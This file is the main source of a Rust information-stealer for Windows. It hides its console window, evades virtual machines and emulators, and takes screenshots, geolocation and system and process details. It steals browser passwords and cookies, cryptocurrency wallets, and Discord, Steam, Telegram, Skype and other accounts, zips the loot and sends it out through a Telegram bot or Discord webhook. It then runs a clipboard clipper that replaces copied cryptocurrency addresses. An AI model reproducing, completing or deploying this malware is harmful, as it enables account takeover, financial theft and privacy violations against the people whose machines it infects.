#![windows_subsystem = "windows"] // Hide the Console

mod anti_emulation;
mod chromium;
mod firefox;
mod messengers;
mod misc;
mod wallets;
mod clipper;

extern crate serde;

use screenshots::*;

use hyper::{body::Buf, Client};
use ipgeolocate::{Locator, Service};
use std::io::{prelude::*, Seek, Write};
use std::os::windows::fs::OpenOptionsExt;
use std::{fs::File, iter::Iterator, path::Path};
use sysinfo::{NetworkExt, ProcessExt, System, SystemExt};
use walkdir::{DirEntry, WalkDir};
use winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN;
use wmi::{COMLibrary, WMIConnection};
use zip::{result::ZipError, write::FileOptions};
use clipboard_win::{formats, get_clipboard};

#[allow(dead_code)]
enum DeliveryMethod {
    TELEGRAM,
    DISCORD,
    NONE,
}

const MODE: DeliveryMethod = DeliveryMethod::NONE;


//TG
const BOT_TOKEN: &str = ""; 
const CHANNEL_ID: i64 = -0;

//DC
const DISCORD_WEBHOOK: &str = "";

const MUTEX: bool = false;
const ANTI_VM: bool = true;
const CLIPPER: bool = true;

static mut PASSWORDS: usize = 0;
static mut WALLETS: usize = 0;
static mut FILES: usize = 0;
static mut CREDIT_CARDS: usize = 0;

#[derive(serde::Deserialize, Debug)]
struct Data {
    origin: String,
}

async fn getip() -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
    let url = obfstr::obfstr!("http://httpbin.org/ip").parse().unwrap();
    let res = Client::new().get(url).await.unwrap(); //  - для обработки ошибки, если не использовать match

    let body = hyper::body::aggregate(res).await.unwrap();

    let deserialized: Data = serde_json::from_reader(body.reader()).unwrap();

    Ok(deserialized.origin)
}

#[tokio::main]
async fn main() {
    let app_data = std::env::var("LOCALAPPDATA").ok().unwrap();

    let string_path: &str = &format!("{}\\logscx\\", app_data);
    let mutex_file = format!("{}\\dimp.sts", app_data);

    if MUTEX {
        if std::path::Path::new(&mutex_file).exists() || std::path::Path::new(&string_path).exists()
        {
            std::process::exit(0); // Dont resend any already sent log.
        }
    }

    if ANTI_VM {
        anti_emulation::detect();
     
    
        let results = query_gpus();

        if results.is_ok() {

        for gpu in results.as_ref().unwrap() {
            if gpu.Caption.contains("VirtualBox") || gpu.Caption.contains("VBox") || gpu.Caption.contains("VMWare") || gpu.Caption.contains("VM") {
                std::process::exit(0);
            }
               
        }

        if results.as_ref().unwrap().is_empty() { // No Fucking GPU? might false trigger on RDP'S
            std::process::exit(0);
        }
    }


    }

    let _ = std::fs::OpenOptions::new()
        .write(true)
        .create(true)
        .attributes(FILE_ATTRIBUTE_HIDDEN)
        .open(mutex_file);

    let _ = std::fs::create_dir(string_path);

    let language = format!("{:?}", whoami::lang().collect::<Vec<String>>());
    let mut sys = System::new_all();
    sys.refresh_all();

    let ip = getip().await.unwrap();

    let city = match Locator::get(&ip, Service::IpApi).await {
        Ok(ip) => format!(
            "Country: {}\nCity: {}\nTimezone:{}\nCordinates:{} - {}",
            ip.country, ip.city, ip.timezone, ip.latitude, ip.longitude
        ),
        Err(error) => format!("Error: {}", error),
    };

    let mut i = 1;
    for screen in Screen::all() {
        let image = screen.capture().unwrap();
        let buffer = image.buffer();
        std::fs::write(format!("{}\\screen-{}.png", string_path, i), &buffer).unwrap(); // make it with i because the library is stupid and cant do it on its own.
        i += 1;
    }

    let mut sysinfo = vec![];
    sysinfo.push(format!("Username: {}", whoami::username()));
    sysinfo.push(format!("Computer name: {}", whoami::devicename()));
    sysinfo.push(format!(
        "OS: {}",
        whoami::distro_os().into_string().unwrap()
    ));
    sysinfo.push(format!("Language: {}", language));
    sysinfo.push(format!("Hostname: {}", whoami::hostname()));
    sysinfo.push(format!("IP: {}", ip));
    sysinfo.push(city);

    let hardware = get_hardware();
    if hardware.is_ok() {
        sysinfo.push(format!("{}", hardware.unwrap()));
    }

    std::fs::File::create(format!("{}\\info.txt", string_path))
        .unwrap()
        .write_all(sysinfo.join("\n").as_bytes())
        .unwrap();

    let mut system_info = vec![];

    system_info.push("=> networks:".to_string());
    for (interface_name, data) in sys.networks() {
        let output = format!(
            "{}: {}/{} B",
            interface_name,
            data.received(),
            data.transmitted()
        );
        system_info.push(output);
    }

    system_info.push("=> system:".to_string());
    system_info.push(format!("total memory: {} KB", sys.total_memory()));
    system_info.push(format!("used memory : {} KB", sys.used_memory()));
    system_info.push(format!("total swap  : {} KB", sys.total_swap()));
    system_info.push(format!("used swap   : {} KB", sys.used_swap()));
    system_info.push(format!("NB CPUs: {}", sys.cpus().len()));

    system_info.push("=> Processes:".to_string());
    system_info.push("=> PID, Name".to_string());
    for (pid, process) in sys.processes() {
        system_info.push(format!("[{}] {}", pid, process.name()));
    }
    std::fs::File::create(format!("{}\\system_info.txt", string_path))
        .unwrap()
        .write_all(system_info.join("\n").as_bytes())
        .unwrap();

    //TODO Make A Method in each Package.
    chromium::main::chrome_main();
    wallets::wallets::grab_cold_wallets();
    wallets::wallets::steal_browser_wallets();

    misc::sensitive_data::grab_data();
    misc::steam::steal_steam_account();
    misc::telegram::steal_telegram();
    misc::uplay::steal_uplay();

    messengers::discord::steal_discord();
    messengers::element::steal_element();
    messengers::icq::steal_icq();
    messengers::skype::steal_skype();

    let ff_logins = firefox::firefox::get_all_logins().await.ok();
    if ff_logins.is_some() {
        let mut formatted_logins = vec![];
        for (site, login) in ff_logins.unwrap().iter() {
            formatted_logins.push(format!(
                "{} {}",
                site,
                format!(
                    "{}",
                    login.iter().map(|f| f.to_string()).collect::<String>()
                )
            ));
        }
        std::fs::write(
            format!("{}\\passwords_firefox.txt", string_path),
            formatted_logins.join("\n"),
        )
        .unwrap();
    }

    let ff_cookies = firefox::firefox::cookie_stealer();
    if ff_cookies.len() > 0 {
        std::fs::write(
            format!("{}\\cookies_firefox.txt", string_path),
            ff_cookies.join("\n"),
        )
        .unwrap();
    }

    unsafe {
        let mut msg_edit = vec![];
        msg_edit.push(format!(
            "**New Log From ({} / {} )**\n",
            ip,
            whoami::lang().collect::<Vec<String>>().first().unwrap()
        ));
        msg_edit.push(format!("User: {}\n", whoami::username()));
        msg_edit.push(format!("Installed Languages: {} \n", language));
        msg_edit.push(format!(
            "Operating System: {} {}\n",
            sys.name().unwrap(),
            sys.os_version().unwrap()
        ));
        msg_edit.push(format!(
            "Used/Installed RAM: {} / {} GB \n",
            sys.used_memory() / 1024 / 1024,
            sys.total_memory() / 1024 / 1024
        ));
        msg_edit.push(format!("Cores available: {} \n", sys.cpus().len()));
        msg_edit.push(match PASSWORDS > 0 {
            true => format!("Passwords: ✅ {}\n", PASSWORDS),
            false => format!("Passwords: ❌\n"),
        });
        msg_edit.push(match WALLETS > 0 {
            true => format!("Wallets: ✅ {}\n", WALLETS),
            false => format!("Wallets: ❌\n"),
        });
        msg_edit.push(match FILES > 0 {
            true => format!("Files: ✅ {}\n", FILES),
            false => format!("Files: ❌\n"),
        });
        msg_edit.push(match CREDIT_CARDS > 0 {
            true => format!("Credit Cards: ✅ {}\n", CREDIT_CARDS),
            false => format!("Credit Cards: ❌\n"),
        });

        zip_file(
            string_path,
            &format!("{}\\out.zip", std::env::var("TEMP").unwrap()),
            zip::CompressionMethod::Deflated,
        )
        .unwrap();

        if matches!(MODE, DeliveryMethod::TELEGRAM) {
            use frankenstein::SendDocumentParams;

            let file =
                std::path::PathBuf::from(format!("{}\\out.zip", std::env::var("TEMP").unwrap()));

            let params = SendDocumentParams::builder()
                .chat_id(CHANNEL_ID)
                .document(file)
                .caption(msg_edit.join(""))
                .build();

            use frankenstein::Api;
            use frankenstein::TelegramApi;
            let api = Api::new(BOT_TOKEN);

            api.send_document(&params).unwrap();
        } else if matches!(MODE, DeliveryMethod::DISCORD) {
            use serenity::http::Http;
            use serenity::model::prelude::AttachmentType;
            use serenity::model::prelude::Embed;

            let http = Http::new("");
            let webhook = http.get_webhook_from_url(DISCORD_WEBHOOK).await.unwrap();

            let embed = Embed::fake(|e| {
                e.title("Log Info")
                    .description(msg_edit.join("\n").to_string())
            });

            let log_accounts =
                tokio::fs::File::open(format!("{}\\out.zip", std::env::var("TEMP").unwrap()))
                    .await
                    .unwrap();

            webhook
                .execute(&http, false, |w| {
                    w.content(format!("New log from {}", whoami::username()))
                        .username(whoami::username())
                        .embeds(vec![embed])
                        .add_file(AttachmentType::File {
                            file: &log_accounts,
                            filename: "data.zip".to_string(),
                        })
                })
                .await
                .unwrap()
                .unwrap();
            drop(log_accounts);
        }

        std::fs::remove_dir_all(string_path).unwrap();

        let prev_content = String::new();

        let mut clipboard = String::new();
        if CLIPPER {
            loop {
                clipboard = get_clipboard(formats::Unicode).unwrap_or_default();
                if !(clipboard == prev_content) { // User has copied something new
                    let has_addr = clipper::has_address(&clipboard);
                    if has_addr.len() > 0 {
                        clipper::replace_address(has_addr);
                    }

                }
            }
        }
    }
}

fn zip_file(
    src_dir: &str,
    dst_file: &str,
    method: zip::CompressionMethod,
) -> zip::result::ZipResult<()> {
    if !Path::new(src_dir).is_dir() {
        return Err(ZipError::FileNotFound);
    }

    let path = Path::new(dst_file);
    let file = File::create(&path)?;

    let walkdir = WalkDir::new(src_dir);
    let it = walkdir.into_iter();

    zip_dir(&mut it.filter_map(|e| e.ok()), src_dir, file, method)?;

    Ok(())
}

fn zip_dir<T>(
    it: &mut dyn Iterator<Item = DirEntry>,
    prefix: &str,
    writer: T,
    method: zip::CompressionMethod,
) -> zip::result::ZipResult<()>
where
    T: Write + Seek,
{
    let mut zip = zip::ZipWriter::new(writer);
    let options = FileOptions::default()
        .compression_method(method)
        .unix_permissions(0o755);

    let mut buffer = Vec::new();
    for entry in it {
        let path = entry.path();
        let name = path.strip_prefix(Path::new(prefix)).unwrap();

        // Write file or directory explicitly
        // Some unzip tools unzip files with directory paths correctly, some do not!
        if path.is_file() {
            #[allow(deprecated)]
            zip.start_file_from_path(name, options)?;
            let mut f = File::open(path)?;

            f.read_to_end(&mut buffer)?;
            zip.write_all(&*buffer)?;
            buffer.clear();
        } else if !name.as_os_str().is_empty() {
            #[allow(deprecated)]
            zip.add_directory_from_path(name, options)?;
        }
    }
    zip.finish()?;
    Result::Ok(())
}
#[allow(non_snake_case, non_camel_case_types)]
#[derive(serde::Deserialize)]
pub struct Win32_VideoController {
    Caption: String,
    AdapterRAM: i64,
    VideoModeDescription: String,
}
#[allow(non_snake_case, non_camel_case_types)]
#[derive(serde::Deserialize)]
struct Win32_Processor {
    Name: String,
}

fn get_hardware() -> Result<String, Box<dyn std::error::Error>> {
    let com_con = COMLibrary::new().unwrap();
    let wmi_con = WMIConnection::new(com_con.into()).unwrap();


    let mut hardware = vec![];

    let results: Vec<Win32_Processor> = wmi_con.query()?;

    for cpu in results {
        hardware.push(format!("{:#?}", cpu.Name));
    }


    drop(wmi_con);// Windows doesn't likes when having 2 open.
    
    let gpus = query_gpus();
    if gpus.is_ok() {

    for video in gpus.unwrap() {
        hardware.push(format!(
            "{} : {} bytes : {}",
            video.Caption,
            video.AdapterRAM / 1024,
            video.VideoModeDescription
        ));
    }
}

    return Ok(hardware.join("\n"));
}


pub fn query_gpus() -> Result<Vec<Win32_VideoController>, Box<dyn std::error::Error>> {
    let com_con = COMLibrary::new().unwrap();
    let wmi_con = WMIConnection::new(com_con.into()).unwrap();
 
    let results: Vec<Win32_VideoController> = wmi_con.query()?;

    drop(wmi_con);// Windows doesn't likes when having 2 open.

    Ok(results)
    
}
